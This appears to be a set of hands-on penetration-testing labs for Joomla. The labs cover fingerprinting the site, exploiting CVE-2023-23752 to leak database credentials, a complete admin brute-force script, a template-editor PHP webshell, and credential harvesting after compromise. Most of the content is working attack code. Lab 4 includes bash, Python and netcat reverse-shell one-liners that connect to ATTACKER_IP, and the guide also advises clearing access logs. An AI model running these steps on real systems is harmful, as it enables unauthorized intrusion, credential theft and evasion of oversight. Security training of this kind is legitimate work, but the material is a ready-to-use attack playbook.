# Joomla Labs

> Hands-on exercises mapped to the methodology. Each lab targets a specific attack path. Work through them in order -- each builds on the previous.

---

## Lab 1: Enumeration & Fingerprinting

**Objective:** Identify a Joomla installation, extract its exact version, and enumerate installed components.

### Steps

- [ ] Confirm Joomla is running
  ```bash
  curl -s http://TARGET/ | grep -i "generator"
  # Expected: <meta name="generator" content="Joomla! - Open Source Content Management" />
  ```

- [ ] Pull exact version from XML
  ```bash
  curl -s http://TARGET/administrator/manifests/files/joomla.xml | xmllint --xpath '//version/text()' - 2>/dev/null
  ```

- [ ] If `xmllint` is unavailable, use grep
  ```bash
  curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep -oP '<version>\K[^<]+'
  ```

- [ ] Check README.txt fallback
  ```bash
  curl -s http://TARGET/README.txt | head -10
  ```

- [ ] Pull robots.txt for directory map
  ```bash
  curl -s http://TARGET/robots.txt
  ```

- [ ] Run droopescan
  ```bash
  droopescan scan joomla --url http://TARGET
  ```

- [ ] Run JoomScan with component enumeration
  ```bash
  joomscan -u http://TARGET -ec
  ```

- [ ] Document findings: version number, accessible directories, installed components

### What to look for

- Exact version number -- cross-reference with CVE list in methodology
- `/installation/` accessible = possibly default creds still active
- Directory listings enabled on `/components/`, `/modules/`, `/plugins/`
- Any third-party components (com_*) -- these are often more vulnerable than core

---

## Lab 2: CVE-2023-23752 -- Unauthenticated Information Disclosure

**Objective:** Extract database credentials and user information without authentication.

**Applies to:** Joomla 4.0.0 through 4.2.7

### Steps

- [ ] Confirm target version is in vulnerable range (4.0.0 - 4.2.7)
  ```bash
  curl -s http://TARGET/administrator/manifests/files/joomla.xml | grep -oP '<version>\K[^<]+'
  ```

- [ ] Leak application configuration (database creds)
  ```bash
  curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | python3 -m json.tool
  ```

- [ ] Extract specific fields from the JSON response
  ```bash
  curl -s "http://TARGET/api/index.php/v1/config/application?public=true" | python3 -c "
  import json, sys
  data = json.load(sys.stdin)
  for attr in data.get('data', []):
      props = attr.get('attributes', {})
      for key in ['host', 'user', 'password', 'db', 'dbprefix', 'dbtype']:
          if key in props:
              print(f'{key}: {props[key]}')
  "
  ```

- [ ] Leak user information
  ```bash
  curl -s "http://TARGET/api/index.php/v1/users?public=true" | python3 -m json.tool
  ```

- [ ] If MySQL is externally accessible, connect directly
  ```bash
  mysql -u EXTRACTED_USER -p'EXTRACTED_PASS' -h TARGET EXTRACTED_DB -e "SELECT username, password FROM PREFIX_users;"
  ```

- [ ] Try extracted credentials for SSH and other services
  ```bash
  ssh EXTRACTED_USER@TARGET
  ```

### Escalation paths

- DB creds --> direct MySQL access --> dump hashes --> crack --> admin login --> template RCE
- DB creds --> SSH with password reuse
- DB creds --> update admin hash directly in the database:
  ```sql
  -- Joomla 3.x+ uses bcrypt; generate a known hash
  -- bcrypt hash for "password123":
  UPDATE PREFIX_users SET password='$2y$10$DpfXjGFhEkj1EXAMPLE' WHERE username='admin';
  ```

---

## Lab 3: Brute Force Admin Panel

**Objective:** Brute force the Joomla admin login at `/administrator/` while handling CSRF tokens.

### Steps

- [ ] Verify admin panel is accessible
  ```bash
  curl -s -o /dev/null -w "%{http_code}" http://TARGET/administrator/
  # 200 = accessible
  ```

- [ ] Manually examine the login form to understand CSRF token
  ```bash
  curl -s http://TARGET/administrator/ | grep -oP 'name="[a-f0-9]{32}" value="1"'
  # The 32-char hex string is the CSRF token field name
  ```

- [ ] Create the brute force script
  ```bash
  cat << 'SCRIPT' > /tmp/joomla-brute.py
  #!/usr/bin/env python3
  """Joomla admin brute forcer with CSRF token handling."""
  import requests
  import re
  import sys
  import argparse

  def main():
      parser = argparse.ArgumentParser(description='Joomla Admin Brute Forcer')
      parser.add_argument('-u', '--url', required=True, help='Target URL (http://TARGET)')
      parser.add_argument('-w', '--wordlist', required=True, help='Password wordlist path')
      parser.add_argument('-usr', '--username', default='admin', help='Username (default: admin)')
      args = parser.parse_args()

      login_url = f"{args.url.rstrip('/')}/administrator/index.php"
      s = requests.Session()
      found = False

      with open(args.wordlist, 'r', errors='ignore') as f:
          for line_num, password in enumerate(f, 1):
              password = password.strip()
              if not password:
                  continue

              # Get fresh page with CSRF token
              try:
                  resp = s.get(login_url, timeout=10)
              except requests.RequestException as e:
                  print(f"[-] Connection error: {e}")
                  break

              tokens = re.findall(r'name="([a-f0-9]{32})" value="1"', resp.text)
              if not tokens:
                  print("[-] Could not extract CSRF token -- site may have changed or blocked us")
                  break

              data = {
                  "username": args.username,
                  "passwd": password,
                  "option": "com_login",
                  "task": "login",
                  tokens[0]: "1"
              }

              try:
                  resp = s.post(login_url, data=data, allow_redirects=False, timeout=10)
              except requests.RequestException as e:
                  print(f"[-] Post error: {e}")
                  continue

              # Successful login = 303 redirect to admin dashboard
              if resp.status_code == 303:
                  location = resp.headers.get("Location", "")
                  if "/administrator/" in location and "index.php" in location:
                      print(f"\n[+] SUCCESS: {args.username}:{password}")
                      found = True
                      break

              if line_num % 50 == 0:
                  print(f"[*] Tried {line_num} passwords...")

      if not found:
          print("\n[-] Exhausted wordlist without finding valid credentials")

  if __name__ == "__main__":
      main()
  SCRIPT
  ```

- [ ] Run the brute force
  ```bash
  python3 /tmp/joomla-brute.py -u http://TARGET -w /usr/share/wordlists/rockyou.txt -usr admin
  ```

- [ ] Try common default credentials first (before full brute force)
  ```bash
  # Quick check of common passwords
  for pass in admin password joomla joomla123 admin123 Password1; do
    echo "$pass" >> /tmp/joomla-quick.txt
  done
  python3 /tmp/joomla-brute.py -u http://TARGET -w /tmp/joomla-quick.txt -usr admin
  ```

### Notes

- Joomla has no default account lockout -- brute force is viable
- CSRF token changes per request -- must fetch a new one each attempt
- Rate limiting may apply via `.htaccess` or WAF -- slow down if getting 403s
- If admin username is unknown, check registration page or enumerate via CVE-2023-23752

---

## Lab 4: Template Editor --> Webshell --> Reverse Shell

**Objective:** Use authenticated admin access to inject a webshell via the template editor and escalate to a reverse shell.

**Prerequisite:** Valid admin credentials (from Lab 2 or Lab 3)

### Steps

- [ ] Log into admin panel at `http://TARGET/administrator/`

- [ ] Navigate to template editor
  - **Joomla 3.x:** `Extensions` --> `Templates` --> `Templates` (sidebar)
  - **Joomla 4.x+:** `System` --> `Site Templates`

- [ ] Identify the active template
  - The default/active template has a star icon next to it
  - Common defaults: `protostar` (3.x), `cassiopeia` (4.x+)

- [ ] Click the template name to open the file editor

- [ ] Select `error.php` for injection
  - Why `error.php`: it is rarely cached, always accessible at a known path, and triggering it does not break the site

- [ ] Generate an obfuscated GET parameter name
  ```bash
  echo -n "pwned" | md5sum | cut -d' ' -f1
  # dcfdd5e021a869fcc6dfaef8bf31377e
  ```

- [ ] Add this line at the top of `error.php`, right after the opening `<?php` tag:
  ```php
  system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
  ```

- [ ] Save the template file

- [ ] Test command execution
  ```bash
  # Joomla 3.x (protostar)
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"

  # Joomla 4.x+ (cassiopeia)
  curl -s "http://TARGET/templates/cassiopeia/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
  ```
  - Expected output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

- [ ] Enumerate the box through the webshell
  ```bash
  # Check what is available
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=which+python3+python+perl+nc+ncat+socat"

  # Read configuration.php
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=cat+/var/www/html/configuration.php"
  ```

- [ ] Start a listener on your attack box
  ```bash
  nc -nlvp 4444
  ```

- [ ] Send reverse shell (try in order of reliability)
  ```bash
  # Option 1: bash reverse shell (URL-encoded)
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"

  # Option 2: python reverse shell
  curl -s --data-urlencode "dcfdd5e021a869fcc6dfaef8bf31377e=python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" \
    "http://TARGET/templates/protostar/error.php"

  # Option 3: nc mkfifo
  curl -s "http://TARGET/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/bash+-i+2>%261|nc+ATTACKER_IP+4444+>/tmp/f"
  ```

- [ ] Upgrade to a full TTY once you catch the shell
  ```bash
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # Ctrl+Z
  stty raw -echo; fg
  export TERM=xterm
  ```

### Cleanup (if stealth matters)

- [ ] Remove the injected line from `error.php` via the admin panel or shell
- [ ] Clear access logs if possible

---

## Lab 5: Post-Exploitation -- Credential Harvesting

**Objective:** Extract credentials from Joomla configuration and database for lateral movement.

**Prerequisite:** Shell access (from Lab 4)

### Steps

- [ ] Extract database credentials from `configuration.php`
  ```bash
  grep -E '^\s+public \$(host|user|password|db|dbprefix)' /var/www/html/configuration.php
  ```

- [ ] Connect to the database
  ```bash
  # Read the values from the grep output above, then:
  mysql -u DB_USER -p'DB_PASS' -h DB_HOST DB_NAME
  ```

- [ ] Dump all user credentials
  ```sql
  -- Find the correct table prefix first
  SHOW TABLES LIKE '%users';

  -- Dump usernames, password hashes, and emails
  SELECT id, name, username, email, password, block FROM PREFIX_users;

  -- Check for Super Users (usergroup_id 8)
  SELECT u.username, u.password, u.email
  FROM PREFIX_users u
  JOIN PREFIX_user_usergroup_map m ON u.id = m.user_id
  WHERE m.group_id = 8;
  ```

- [ ] Save hashes for offline cracking
  ```bash
  # From the mysql output, save in hash:salt or $2y$ format
  # Joomla 3.x+ = bcrypt ($2y$10$...)
  mysql -u DB_USER -p'DB_PASS' DB_NAME -e "SELECT CONCAT(username,':',password) FROM PREFIX_users;" -N > /tmp/joomla_hashes.txt
  ```

- [ ] Crack hashes with hashcat
  ```bash
  # Joomla 3.x bcrypt
  hashcat -m 3200 joomla_hashes.txt /usr/share/wordlists/rockyou.txt

  # Joomla 2.x MD5 (format: hash:salt)
  hashcat -m 11 joomla_hashes.txt /usr/share/wordlists/rockyou.txt
  ```

- [ ] Test credential reuse across the box
  ```bash
  # Try each cracked password against SSH for each system user
  cat /etc/passwd | grep -E '/bin/(ba)?sh' | cut -d: -f1 | while read user; do
    echo "[*] Trying SSH as $user with DB password..."
    sshpass -p 'CRACKED_PASS' ssh -o StrictHostKeyChecking=no $user@localhost whoami 2>/dev/null && echo "[+] SUCCESS: $user"
  done
  ```

- [ ] Look for other config files with credentials
  ```bash
  # Other CMS configs on the same box
  find /var/www -maxdepth 4 -name "wp-config.php" -o -name "configuration.php" -o -name ".env" -o -name "config.php" 2>/dev/null

  # Backup files
  find /var/www -name "*.sql" -o -name "*.sql.gz" -o -name "*.bak" 2>/dev/null
  ```

- [ ] Check for internal network access (pivot potential)
  ```bash
  ip addr
  ip route
  arp -a
  cat /etc/hosts
  ```

### Escalation from here

- Cracked passwords --> try on other services (FTP, SMB, RDP)
- DB access --> look for other databases on the server
- Internal network --> pivot with chisel/ligolo/sshuttle
- Privilege escalation --> run linpeas/linEnum on the box

---

## Lab Workflow Summary

```
Lab 1: Enumerate
  └── Version + components identified
       │
       ├── Version 4.0-4.2.7?
       │   └── Lab 2: CVE-2023-23752 --> DB creds --> direct DB access or cred reuse
       │
       ├── No CVE match?
       │   └── Lab 3: Brute force /administrator/
       │
       └── Got admin creds (from Lab 2 or 3)?
           └── Lab 4: Template editor --> webshell --> reverse shell
               └── Lab 5: Post-exploit --> configuration.php --> DB --> cred reuse --> pivot
```
